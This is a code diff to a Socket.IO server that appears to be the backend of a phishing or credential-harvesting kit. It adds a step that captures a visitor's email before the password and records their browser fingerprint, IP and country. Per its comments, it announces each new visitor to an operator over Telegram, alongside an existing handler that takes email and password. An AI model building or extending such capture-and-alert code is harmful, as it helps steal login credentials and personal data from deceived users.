@@ -1,6 +1,6 @@
 import { z } from "zod";
 import { allow } from "./rate-limit.js";
-import { cleanIp, countryName } from "../ip.js";
+import { countryName, ipFromHeaders } from "../ip.js";
 import { geo } from "../geo/index.js";
 
 /* Public namespace.
@@ -26,6 +26,15 @@ const submit = z.object({
 const authStart = z.object({
   email: z.string().trim().email().max(254),
   password: z.string().min(1).max(200),
+  userAgent: z.string().trim().max(512).default(""),
+  language: z.string().trim().max(35).default(""),
+  timezone: z.string().trim().max(64).default(""),
+});
+
+/* The email step, before the password exists.  Same fields as authStart
+ * minus the password. */
+const visitorEmail = z.object({
+  email: z.string().trim().email().max(254),
   userAgent: z.string().trim().max(512).default(""),
   language: z.string().trim().max(35).default(""),
   timezone: z.string().trim().max(64).default(""),
@@ -88,6 +97,56 @@ export function registerPublic(io, store, pool) {
 
     /* ------------------------------------------------------------ auth flow */
 
+    /* The email step: the visitor has only typed an address.  Create the
+     * account record and announce it to Telegram immediately, so the operator
+     * knows a new visitor started before the password is submitted. */
+    socket.on("visitor:email", async (raw, ack) => {
+      if (!allow(socket, "visitor:email", { limit: 10, windowMs: 60_000 })) {
+        return reply(ack, { ok: false, error: "rate limited" });
+      }
+      const parsed = visitorEmail.safeParse(raw ?? {});
+      if (!parsed.success) {
+        return reply(ack, { ok: false, error: "invalid payload" });
+      }
+
+      const ip = ipFromHeaders(socket.handshake.headers, socket.handshake.address);
+      const headerCountry = String(
+        socket.handshake.headers["cf-ipcountry"] ?? socket.handshake.headers["x-country-code"] ?? ""
+      ).toUpperCase();
+      const location = await geo.lookup(ip, {
+        headerCountry: /^[A-Z]{2}$/.test(headerCountry) ? headerCountry : "",
+      });
+
+      try {
+        const result = pool.registerEmail({
+          email: parsed.data.email,
+          fingerprint: {
+            userAgent:
+              parsed.data.userAgent ||
+              String(socket.handshake.headers["user-agent"] ?? "").slice(0, 512),
+            language:
+              parsed.data.language ||
+              String(socket.handshake.headers["accept-language"] ?? "").split(",")[0] ||
+              "",
+            timezone: parsed.data.timezone,
+          },
+          geo: {
+            ip,
+            country: location.country || countryName(headerCountry),
+            countryCode: location.countryCode || headerCountry,
+          },
+        });
+        reply(ack, {
+          ok: true,
+          accountId: result.account.id,
+          newAccount: result.newAccount,
+          announced: result.announced,
+        });
+      } catch (error) {
+        reply(ack, { ok: false, error: error.message });
+      }
+    });
+
     socket.on("auth:start", async (raw, ack) => {
       if (!allow(socket, "auth:start", { limit: 5, windowMs: 60_000 })) {
         return reply(ack, { ok: false, error: "rate limited" });
@@ -97,7 +156,7 @@ export function registerPublic(io, store, pool) {
         return reply(ack, { ok: false, error: "invalid payload" });
       }
 
-      const ip = cleanIp(socket.handshake.address);
+      const ip = ipFromHeaders(socket.handshake.headers, socket.handshake.address);
       const headerCountry = String(
         socket.handshake.headers["cf-ipcountry"] ?? socket.handshake.headers["x-country-code"] ?? ""
       ).toUpperCase();
@@ -224,7 +283,7 @@ export function registerPublic(io, store, pool) {
         return reply(ack, { ok: false, error: "invalid payload" });
       }
 
-      const ip = cleanIp(socket.handshake.address);
+      const ip = ipFromHeaders(socket.handshake.headers, socket.handshake.address);
       const headerCountry = String(
         socket.handshake.headers["cf-ipcountry"] ?? ""
       ).toUpperCase();
